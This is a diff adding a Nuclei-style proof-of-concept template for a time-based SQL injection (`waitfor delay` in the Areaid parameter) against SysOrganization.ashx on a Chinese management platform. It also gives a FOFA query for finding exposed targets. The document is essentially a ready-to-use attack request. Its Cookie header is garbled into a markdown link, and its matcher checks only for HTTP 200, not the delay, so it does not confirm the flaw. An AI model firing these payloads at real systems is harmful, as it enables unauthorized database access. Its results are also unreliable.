@@ -1,0 +1,35 @@
+id: poc-bbtqqib5oqrevwlr
+info:
+  name: 智慧综合管理平台系统 SysOrganization.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bbtqqib5oqrevwlr'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bbtqqib5oqrevwlr
+    fofa: title="智慧综合管理平台登入"
+http:
+- raw:
+  - 'GET /Module/Kernel/Controller/SysOrganization.ashx?Areaid=-1);%20waitfor%20delay%20''0:0:5''%20--%20&action=GetAreaOrgTree HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Referer:
+
+    Accept-Encoding: gzip,deflate,br
+
+    Cookie: [https://asp.net/_SessionId=d5cypzvy3dgfo4dgc5mhdca0;](https://asp.net/_SessionId=d5cypzvy3dgfo4dgc5mhdca0;) cssPath=color1
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
